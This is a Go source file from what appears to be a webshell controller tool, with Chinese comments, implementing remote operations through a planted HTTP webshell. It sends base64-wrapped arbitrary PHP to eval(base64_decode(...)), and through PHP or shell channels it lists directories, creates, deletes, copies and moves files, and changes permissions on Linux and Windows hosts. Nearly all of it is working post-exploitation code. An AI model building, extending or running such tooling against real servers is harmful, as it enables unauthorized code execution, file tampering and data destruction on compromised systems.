package session

// Reconstructed (D:/ARTEX/session/http_shell_ops.go).
// HTTP webshell 文件操作原语：eval/ls/mkdir/rm/mv，PHP 直发与 shell 命令两条通道。

import (
	"context"
	"encoding/base64"
	"fmt"
	"strings"
	"time"
)

// phpEval 经 webshell 执行任意 PHP（返回 stdout）。
func (h *HTTPShell) phpEval(code string) (string, error) {
	payload := fmt.Sprintf(`eval(base64_decode("%s"));`, base64.StdEncoding.EncodeToString([]byte(code)))
	out, _, err := h.Exec(context.Background(), payload, 30*time.Second)
	return out, err
}

// EvalPHP 等价 phpEval（工具入口用）。
func (h *HTTPShell) EvalPHP(code string) (string, error) { return h.phpEval(code) }

// PHPNative 跑一段 PHP 原生函数调用（echo 包输出）。
func (h *HTTPShell) PHPNative(code string) (string, error) { return h.phpEval(code) }

func phpStr(s string) string {
	return fmt.Sprintf("base64_decode(\"%s\")", base64.StdEncoding.EncodeToString([]byte(s)))
}

// ListDir 列目录：name\tsize\tmtime\tperm 每行一条（base64 name）。
// 非 php 会话退化为平台 ls/dir（只有 name 列，无 stat 字段）。
func (h *HTTPShell) ListDir(dir string) ([]string, error) {
	if h.lang != "php" {
		var cmd string
		if h.platform == "windows" {
			cmd = `dir /b /a "` + strings.ReplaceAll(dir, `"`, "") + `"`
		} else {
			cmd = fmt.Sprintf("ls -1A '%s' 2>/dev/null", strings.ReplaceAll(dir, "'", `'"'"'`))
		}
		out, _, err := h.execCmd(context.Background(), cmd, 30*time.Second)
		if err != nil {
			return nil, err
		}
		var rows []string
		for _, line := range strings.Split(out, "\n") {
			if line = strings.TrimRight(line, "\r "); line != "" {
				rows = append(rows, line)
			}
		}
		return rows, nil
	}
	code := fmt.Sprintf(`$d=%s;$h=opendir($d);while(($f=readdir($h))!==false){$p=$d."/".$f;$st=@stat($p);echo base64_encode($f)."\t".$st['size']."\t".$st['mtime']."\t".decoct($st['mode'])."\n";}closedir($h);`, phpStr(dir))
	out, err := h.phpEval(code)
	if err != nil {
		return nil, err
	}
	var rows []string
	for _, line := range strings.Split(out, "\n") {
		line = strings.TrimRight(line, "\r")
		if line == "" {
			continue
		}
		cols := strings.Split(line, "\t")
		if b, err := base64.StdEncoding.DecodeString(cols[0]); err == nil {
			cols[0] = string(b)
		}
		rows = append(rows, strings.Join(cols, "\t"))
	}
	return rows, nil
}

// Mkdir 建目录（递归；非 php 会话走平台 mkdir）。
func (h *HTTPShell) Mkdir(dir string) error {
	if h.lang != "php" {
		_, err := h.shellFileAction("mkdir", dir, "")
		return err
	}
	code := fmt.Sprintf(`@mkdir(%s,0755,true);echo file_exists(%s)?"ok":"fail";`, phpStr(dir), phpStr(dir))
	out, err := h.phpEval(code)
	if err != nil {
		return err
	}
	if !strings.Contains(out, "ok") {
		return fmt.Errorf("mkdir 失败: %s", out)
	}
	return nil
}

// phpFileAction 通用文件动作：del/cp/mv/chmod。
func (h *HTTPShell) phpFileAction(action, a, b string) (string, error) {
	var code string
	switch action {
	case "del":
		code = fmt.Sprintf(`echo @unlink(%s)?"ok":"fail";`, phpStr(a))
	case "cp":
		code = fmt.Sprintf(`echo @copy(%s,%s)?"ok":"fail";`, phpStr(a), phpStr(b))
	case "mv":
		code = fmt.Sprintf(`echo @rename(%s,%s)?"ok":"fail";`, phpStr(a), phpStr(b))
	case "chmod":
		code = fmt.Sprintf(`echo @chmod(%s,octdec(%s))?"ok":"fail";`, phpStr(a), phpStr(b))
	}
	return h.phpEval(code)
}

// shellFileAction shell 通道的等价动作，按会话平台选命令族：
// windows(aspx/jsp-on-win) 走 cmd 内建 del/move/mkdir，linux 走 rm/cp/mv/mkdir -p。
func (h *HTTPShell) shellFileAction(action, a, b string) (string, error) {
	var cmd string
	win := h.platform == "windows"
	q := func(s string) string { return `"` + strings.ReplaceAll(s, `"`, `\"`) + `"` }
	switch action {
	case "del":
		if win {
			cmd = "del /f /q " + q(a)
		} else {
			cmd = fmt.Sprintf("rm -f '%s'", strings.ReplaceAll(a, "'", `'"'"'`))
		}
	case "cp":
		if win {
			cmd = "copy /y " + q(a) + " " + q(b)
		} else {
			cmd = fmt.Sprintf("cp '%s' '%s'", a, b)
		}
	case "mv":
		if win {
			cmd = "move /y " + q(a) + " " + q(b)
		} else {
			cmd = fmt.Sprintf("mv '%s' '%s'", a, b)
		}
	case "mkdir":
		if win {
			cmd = "mkdir " + q(a)
		} else {
			cmd = fmt.Sprintf("mkdir -p '%s'", a)
		}
	}
	out, _, err := h.execCmd(context.Background(), cmd, 30*time.Second)
	return out, err
}

// DeleteFile 删文件（PHP→shell 回退；非 php 会话直接走平台命令）。
func (h *HTTPShell) DeleteFile(p string) error {
	if h.lang == "php" {
		out, err := h.phpFileAction("del", p, "")
		if err == nil && strings.Contains(out, "ok") {
			return nil
		}
	}
	_, err := h.shellFileAction("del", p, "")
	return err
}

// RenameFile 改名/移动（PHP→shell 回退；非 php 会话直接走平台命令）。
func (h *HTTPShell) RenameFile(a, b string) error {
	if h.lang == "php" {
		out, err := h.phpFileAction("mv", a, b)
		if err == nil && strings.Contains(out, "ok") {
			return nil
		}
	}
	_, err := h.shellFileAction("mv", a, b)
	return err
}
